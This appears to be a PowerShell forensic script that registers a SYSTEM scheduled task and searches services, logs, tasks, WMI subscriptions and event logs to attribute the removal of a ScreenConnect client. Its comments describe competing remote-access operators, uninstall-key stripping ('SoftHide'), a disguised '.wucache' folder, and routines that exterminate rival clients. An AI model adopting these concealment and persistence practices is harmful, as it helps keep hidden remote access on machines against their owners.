# WINRTCS_YOGA_FORENSIC - attribute who removed Gryxa (do not reinstall).
# Log: C:\Users\Public\yoga_forensic.log
# Prefer schtasks SYSTEM (Guest kills at 10s). Self-detach if launched interactively.
$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference = 'SilentlyContinue'
$log = 'C:\Users\Public\yoga_forensic.log'

if ($env:YOGA_FORENSIC_INNER -ne '1') {
    try {
        $tn = 'WinRTCSYogaForensic'
        Unregister-ScheduledTask -TaskName $tn -Confirm:$false -ErrorAction SilentlyContinue
        $a = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-NoP -NonI -EP Bypass -Command "$env:YOGA_FORENSIC_INNER=''1''; & ''C:\Users\Public\yoga_forensic.ps1''"'
        $st = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -ExecutionTimeLimit (New-TimeSpan -Minutes 15)
        $p = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
        Register-ScheduledTask -TaskName $tn -Action $a -Settings $st -Principal $p -Force | Out-Null
        Start-ScheduledTask -TaskName $tn
        'QUEUED yoga-forensic - wait ~60s then: type C:\Users\Public\yoga_forensic.log' | Set-Content $log -Encoding UTF8
        Write-Output 'QUEUED'
        exit 0
    } catch {
        # fall through and run inline if task create fails
        $env:YOGA_FORENSIC_INNER = '1'
    }
}

function L([string]$m) {
    $line = "[{0}] {1}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'), $m
    Add-Content -Path $log -Value $line -Encoding UTF8
    Write-Output $line
}

'=== YOGA FORENSIC begin host=' + $env:COMPUTERNAME | Set-Content $log -Encoding UTF8
L ("user=" + [System.Security.Principal.WindowsIdentity]::GetCurrent().Name)
L ("boot=" + (Get-CimInstance Win32_OperatingSystem).LastBootUpTime)
L ("os=" + (Get-CimInstance Win32_OperatingSystem).Caption)

$Gryxa = '36e506ff016b2151'
$scores = [ordered]@{}
function Hit([string]$actor, [int]$w, [string]$why) {
    if (-not $scores.Contains($actor)) { $scores[$actor] = 0 }
    $scores[$actor] += $w
    L ("HIT actor=$actor weight=$w :: $why")
}

# --- Current SC inventory ---
L '=== SC_NOW ==='
$svcG = $null
Get-CimInstance Win32_Service | Where-Object { $_.Name -like 'ScreenConnect Client*' } | ForEach-Object {
    $fp = [regex]::Match($_.Name, '\(([0-9A-Fa-f]+)\)').Groups[1].Value.ToLower()
    $h = ''; if ($_.PathName -match '[?&]h=([^&\s\"]+)') { $h = $Matches[1] }
    L ("SVC fp=$fp state=$($_.State) start=$($_.StartMode) h=$h")
    if ($fp -eq $Gryxa) { $script:svcG = $_ }
}
if (-not $svcG) { L 'SC_NOW Gryxa ABSENT' } else { L ('SC_NOW Gryxa PRESENT state=' + $svcG.State) }

# --- Install dirs / leftover ---
L '=== DIRS ==='
foreach ($p in @(
        "C:\Program Files (x86)\ScreenConnect Client ($Gryxa)",
        "C:\Program Files\ScreenConnect Client ($Gryxa)",
        "C:\ProgramData\ScreenConnect Client ($Gryxa)"
    )) {
    if (Test-Path -LiteralPath $p) {
        $i = Get-Item -LiteralPath $p
        L ("DIR_EXISTS $p mtime=$($i.LastWriteTime.ToString('o'))")
        Hit 'orphan_dir_no_svc' 1 "Gryxa dir left after service gone (classic delete/sc wipe)"
    } else { L ("DIR_MISSING $p") }
}

# --- Hostile stack presence ---
L '=== HOSTILE_STACK ==='
$map = @{
    'KeepTwo_SCCleanup' = @('C:\ProgramData\SCCleanup', 'C:\Users\Public\SC-KeepTwo-RemoveRest.ps1', 'C:\Windows\Temp\SC-KeepTwo-RemoveRest.ps1')
    'pluxn_migrate'     = @('C:\ProgramData\SCAgentMigration', 'C:\ProgramData\RMMCleanup', 'C:\ProgramData\YourMSP')
    'SCWatchdog'        = @('C:\ProgramData\SCWatchdog', 'C:\Program Files\SCWatchdog', 'C:\Program Files (x86)\SCWatchdog')
    'vexlm'             = @('C:\ProgramData\SCRepair', 'C:\Security')
}
foreach ($k in $map.Keys) {
    foreach ($p in $map[$k]) {
        if (Test-Path -LiteralPath $p) {
            $mtime = (Get-Item -LiteralPath $p).LastWriteTime.ToString('o')
            L ("PATH $k => $p mtime=$mtime")
            Hit $k 5 "path still present $p"
            Get-ChildItem -LiteralPath $p -Recurse -File -ErrorAction SilentlyContinue |
                Sort-Object LastWriteTime -Descending | Select-Object -First 8 |
                ForEach-Object { L ("  FILE $($_.LastWriteTime.ToString('s')) $($_.FullName) bytes=$($_.Length)") }
        }
    }
}

# --- Key logs (tail + keyword hunt) ---
L '=== KEY_LOGS ==='
$logFiles = @(
    'C:\ProgramData\SCCleanup\cleanup.log',
    'C:\ProgramData\SCCleanup\SCCleanup.log',
    'C:\ProgramData\SCAgentMigration\migration.log',
    'C:\ProgramData\RMMCleanup\RMMCleanup_.log',
    'C:\ProgramData\SCWatchdog\watchdog.log',
    'C:\ProgramData\SCWatchdog\deploy.log',
    'C:\Users\Public\gryxa_recover.log',
    'C:\Users\Public\yoga_pr.log',
    'C:\Users\Public\yoga_gryxa_fix.log',
    'C:\Users\Public\gryxa_local_install.log',
    'C:\Users\Public\winrtcs_anti.log',
    'C:\Users\Public\gryxa_dns_fix.log',
    'C:\ProgramData\WinRTCS\killer.out',
    'C:\ProgramData\WinRTCS\guard.log',
    'C:\ProgramData\WinRTCS\rmm.top',
    'C:\ProgramData\WinRTCS\digest.txt',
    'C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache\exterminate.log',
    'C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache\own_mon.log',
    'C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache\own.log'
)
foreach ($f in $logFiles) {
    if (-not (Test-Path -LiteralPath $f)) { continue }
    $fi = Get-Item -LiteralPath $f
    L ("LOG $f bytes=$($fi.Length) mtime=$($fi.LastWriteTime.ToString('o'))")
    $tail = Get-Content -LiteralPath $f -Tail 40 -ErrorAction SilentlyContinue
    foreach ($line in $tail) { L ("  | $line") }
    $blob = (Get-Content -LiteralPath $f -Raw -ErrorAction SilentlyContinue)
    if (-not $blob) { continue }
    if ($blob -match '(?i)36e506ff|gryxa') {
        if ($f -match 'SCCleanup|KeepTwo' -and $blob -match '(?i)(remove|uninstall|/x|sc delete|deleted|36e506ff)') {
            Hit 'KeepTwo_SCCleanup' 10 "cleanup log mentions Gryxa/remove"
        }
        if ($f -match 'gryxa_recover' -and $blob -match '(?i)FAIL_NO_MSI|FAIL_svc|step_msiexec_x|sc delete') {
            Hit 'our_R3_recover_incomplete' 8 "recover log shows /x or delete then fail"
        }
        if ($f -match 'exterminate' -and $blob -match '(?i)(36e506ff|gryxa\.com).{0,40}(kill|delete|removed|msiexec)') {
            Hit 'own_exterminate' 9 "exterminate.log targeted Gryxa"
        }
        if ($f -match 'guard\.log' -and $blob -match '(?i)gryxa_absent|msiexec_exit|FAIL_svc|shared') {
            Hit 'winrtcs_guard_reinstall_loop' 6 "guard log shows absent/reinstall cycle"
        }
        if ($f -match 'migration|RMMCleanup' -and $blob -match '(?i)36e506ff|ScreenConnect|remove|uninstall') {
            Hit 'pluxn_migrate' 8 "pluxn migration/cleanup log touched SC/Gryxa"
        }
    }
}

# --- Tasks ---
L '=== TASKS ==='
$taskPat = 'SCWatchdog|SCCleanup|KeepTwo|RemoveRest|SCRepair|MSServices|vexlm|pluxn|zytrx|uvexr|pulsv|SCAgentMigration|RMMCleanup|SC_Monitor|SCEmergency|SysMaint|scwd|Watchdog|yoga|Gryxa|WinRTCS|Wucache|own_mon'
$raw = & schtasks.exe /Query /FO CSV /V 2>$null
if ($raw) {
    $csv = $raw | ConvertFrom-Csv
    foreach ($t in $csv) {
        $tn = [string]$t.TaskName
        $acts = [string]$t.'Task To Run'
        if (-not $acts) { $acts = [string]$t.TaskToRun }
        $last = [string]$t.'Last Run Time'
        $result = [string]$t.'Last Result'
        if (($tn -match $taskPat) -or ($acts -match $taskPat)) {
            L ("TASK $tn last=$last result=$result => $acts")
            if ($tn -match 'KeepTwo|SCCleanup|RemoveRest' -or $acts -match 'KeepTwo|SCCleanup|RemoveRest') {
                Hit 'KeepTwo_SCCleanup' 7 "scheduled task still registered: $tn"
            }
            if ($tn -match 'SCAgentMigration|RMMCleanup|pluxn' -or $acts -match 'SCAgentMigration|RMMCleanup|pluxn') {
                Hit 'pluxn_migrate' 6 "pluxn task: $tn"
            }
            if ($tn -match 'SCWatchdog|SystemHealth|BVT' -or $acts -match 'SCWatchdog|scwd') {
                Hit 'SCWatchdog' 6 "watchdog task: $tn"
            }
        }
    }
}

# --- WMI ---
L '=== WMI ==='
$ns = 'root\subscription'
$wmiPat = 'SCWatchdog|SystemHealthMonitor|BVT|Wucache|SCCleanup|KeepTwo|SC_Monitor|vexlm|SCRepair|MSServices|pluxn|zytrx|scwd|RemoveRest'
Get-WmiObject -Namespace $ns -Class CommandLineEventConsumer -ErrorAction SilentlyContinue | ForEach-Object {
    $blob = ([string]$_.Name + ' ' + [string]$_.CommandLineTemplate) -replace '\s+', ' '
    if ($blob -match $wmiPat) {
        L ("WMI_CONS " + $blob.Substring(0, [Math]::Min(240, $blob.Length)))
        if ($blob -match 'KeepTwo|SCCleanup|RemoveRest') { Hit 'KeepTwo_SCCleanup' 8 "WMI consumer KeepTwo/SCCleanup" }
        elseif ($blob -match 'SCWatchdog|BVT|SystemHealth') { Hit 'SCWatchdog' 7 "WMI consumer watchdog family" }
        elseif ($blob -match 'pluxn|RMMCleanup|SCAgent') { Hit 'pluxn_migrate' 7 "WMI consumer pluxn" }
        else { Hit 'hostile_wmi' 4 "WMI consumer match" }
    }
}
Get-WmiObject -Namespace $ns -Class __EventFilter -ErrorAction SilentlyContinue | ForEach-Object {
    $blob = ([string]$_.Name + ' ' + [string]$_.Query) -replace '\s+', ' '
    if ($blob -match $wmiPat) {
        L ("WMI_FILT " + $blob.Substring(0, [Math]::Min(240, $blob.Length)))
    }
}

# --- MSI Installer event log (who uninstalled ScreenConnect) ---
L '=== EVENTLOG_MSI ==='
try {
    $ev = Get-WinEvent -FilterHashtable @{ LogName = 'Application'; ProviderName = 'MsiInstaller'; StartTime = (Get-Date).AddDays(-14) } -MaxEvents 200 -ErrorAction Stop |
        Where-Object { $_.Message -match '(?i)ScreenConnect|9D7CC418|36e506ff|gryxa' }
    foreach ($e in $ev | Select-Object -First 30) {
        $msg = ($e.Message -replace '\s+', ' ').Trim()
        if ($msg.Length -gt 280) { $msg = $msg.Substring(0, 280) }
        L ("MSI $($e.TimeCreated.ToString('s')) id=$($e.Id) $msg")
        if ($e.Id -in 1029, 1034, 11724, 1033 -or $msg -match '(?i)removal|removed|uninstall') {
            Hit 'msiexec_uninstall_event' 4 "MSI removal event at $($e.TimeCreated.ToString('s'))"
        }
    }
} catch { L ("EVENTLOG_MSI_FAIL " + $_.Exception.Message) }

# --- System log: service delete ---
L '=== EVENTLOG_SERVICE ==='
try {
    Get-WinEvent -FilterHashtable @{ LogName = 'System'; ProviderName = 'Service Control Manager'; StartTime = (Get-Date).AddDays(-14) } -MaxEvents 400 -ErrorAction Stop |
        Where-Object { $_.Message -match '(?i)ScreenConnect|36e506ff' } |
        Select-Object -First 40 |
        ForEach-Object {
            $msg = ($_.Message -replace '\s+', ' ').Trim()
            if ($msg.Length -gt 260) { $msg = $msg.Substring(0, 260) }
            L ("SCM $($_.TimeCreated.ToString('s')) id=$($_.Id) $msg")
            if ($_.Id -eq 7045) { L '  (note: 7045=service installed)' }
            if ($msg -match '(?i)deleted|removed' -or $_.Id -eq 7044) {
                Hit 'scm_service_deleted' 3 "SCM event deleted/changed SC service"
            }
        }
} catch { L ("EVENTLOG_SERVICE_FAIL " + $_.Exception.Message) }

# --- WinRTCS SoftHide / ARP ---
L '=== WINRTCS_SOFTHIDE ==='
$zd = 'C:\ProgramData\WinRTCS'
if (Test-Path $zd) {
    Get-ChildItem $zd -Force | Sort-Object LastWriteTime -Descending | Select-Object -First 25 |
        ForEach-Object { L ("ZD $($_.LastWriteTime.ToString('s')) $($_.Name) bytes=$($_.Length)") }
    if (Test-Path "$zd\softhide.bak") { L 'SOFTHIDE_BAK present (ARP keys were stripped — does not delete service)' }
}

# --- Registry: leftover Gryxa product / shared PC ---
L '=== REG_PRODUCTS ==='
$keys = @(
    'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*',
    'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*'
)
Get-ItemProperty $keys -ErrorAction SilentlyContinue |
    Where-Object { $_.DisplayName -match 'ScreenConnect' -or $_.PSChildName -match '9D7CC418|36e506ff' } |
    ForEach-Object {
        L ("ARP name=$($_.DisplayName) guid=$($_.PSChildName) uninstall=$($_.UninstallString)" )
    }
# Installer Products phantom
Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products' -ErrorAction SilentlyContinue |
    ForEach-Object {
        $pn = (Get-ItemProperty (Join-Path $_.PSPath 'InstallProperties') -EA 0).DisplayName
        if ($pn -match 'ScreenConnect') {
            L ("INST_PRODUCT $($_.PSChildName) name=$pn")
        }
    }

# --- f861 relay = pluxn means competitor owns shared FP ---
L '=== SHARED_FP ==='
$f861 = Get-CimInstance Win32_Service | Where-Object { $_.Name -eq 'ScreenConnect Client (f861c8140d453427)' } | Select-Object -First 1
if ($f861 -and $f861.PathName -match 'pluxn') {
    L 'f861 dialed to update.pluxn.com — Pluxn primary on shared keeper FP'
    Hit 'pluxn_ecosystem' 2 "pluxn owns f861; their migrate/cleanup often strips foreign SC (Gryxa)"
}

# --- Attribution rollup ---
L '=== ATTRIBUTION ==='
if ($scores.Count -eq 0) {
    L 'NO_STRONG_HITS — need MSI/SCM events or logs; possible silent UpgradeCode wipe by sevrz/pluxn MSI /i'
    Hit 'shared_upgradecode_wipe' 1 'default hypothesis when Gryxa gone but sevrz+pluxn remain with no killer logs'
} else {
    $ordered = $scores.GetEnumerator() | Sort-Object Value -Descending
    foreach ($o in $ordered) { L ("SCORE $($o.Key)=$($o.Value)") }
    $top = $ordered | Select-Object -First 1
    L ("PRIMARY_SUSPECT=$($top.Key) score=$($top.Value)")
    switch -Regex ($top.Key) {
        'KeepTwo' { L 'MEANING: SC-KeepTwo-RemoveRest keeps only f861(+hostile FP) and msiexec/sc-deletes Gryxa (CASES C33).' }
        'pluxn' { L 'MEANING: Pluxn migration/RMMCleanup stack removes non-pluxn ScreenConnect clients.' }
        'SCWatchdog' { L 'MEANING: SCWatchdog/zytrx family WMI persistence removes foreign SC.' }
        'our_R3' { L 'MEANING: our gryxa_recover R3 did sc delete + msiexec /x shared PC then failed MSI fetch/start — left Gryxa absent; keepers re-healed.' }
        'own_exterminate' { L 'MEANING: own_lib Invoke-Exterminate treated Gryxa as foreign (pre-L26 FP keep bug).' }
        'winrtcs_guard' { L 'MEANING: guard false-absent loop (C32 locale) or old install path wiped via shared ProductCode.' }
        'shared_upgradecode' { L 'MEANING: ScreenConnect shared UpgradeCode — sevrz/pluxn msiexec /i can unregister Gryxa product/service.' }
        'msiexec_uninstall' { L 'MEANING: Windows Installer logged an uninstall; correlate timestamp with KEY_LOGS/TASKS above.' }
    }
}

L 'FORENSIC_DONE'
Write-Output 'FORENSIC_DONE'
